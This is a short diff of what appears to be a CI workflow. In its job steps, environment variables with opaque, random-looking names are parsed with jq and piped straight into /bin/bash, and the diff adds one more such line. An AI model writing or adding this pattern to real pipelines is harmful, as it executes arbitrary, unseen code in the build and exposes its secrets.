@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$evl426" | jq -r .bp41 | /bin/bash
           printf '%s' "$t91" | jq -r .po1261 | /bin/bash
           printf '%s' "$i577" | jq -r .uvo42 | /bin/bash
+          echo $auztm8105 | jq -r .srkbf1 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
